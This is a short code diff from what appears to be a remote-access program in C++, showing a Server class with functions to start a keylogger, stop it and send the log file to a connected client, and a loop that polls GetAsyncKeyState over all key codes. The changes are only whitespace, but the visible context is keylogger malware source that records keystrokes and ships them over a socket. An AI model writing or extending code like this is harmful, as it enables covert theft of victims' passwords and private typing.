@@ -345,7 +345,6 @@ void Server::startKeyLogger() {
         keyLoggerThread = std::thread(&Server::keyLogger, this);
         std::cout << "Keylogger started.\n";
 }
-
 // Function to stop keylogger and send log file to client
 void Server::stopKeyLogger(SOCKET clientSocket) {
     isLogging = false;
@@ -377,7 +376,7 @@ void Server::keyLogger() {
     while (isLogging) {
         Sleep(10);
         for (int i = 8; i <= 255; i++) {
-            if (GetAsyncKeyState(i) == -32767) {
+           if (GetAsyncKeyState(i) == -32767) {
                 std::lock_guard<std::mutex> lock(logMutex);
                 // Check if the key is in the special key map
                 auto it = keyMap.find(i);
